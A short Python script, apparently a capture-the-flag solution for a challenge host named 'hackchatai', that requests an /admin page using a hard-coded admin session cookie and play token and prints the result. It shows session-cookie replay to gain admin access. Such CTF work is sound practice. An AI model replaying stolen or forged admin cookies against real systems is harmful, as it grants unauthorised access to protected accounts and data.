import requests

url = "https://ictf24-high-hackchatai.chals.io/admin"
cookies = {
    "admin_cookie": "NBtL78S9MCdb8sOC",
    "play_token": "2ht823oPJa5jPrcy"
}

response = requests.get(url, cookies=cookies)

print(response.text)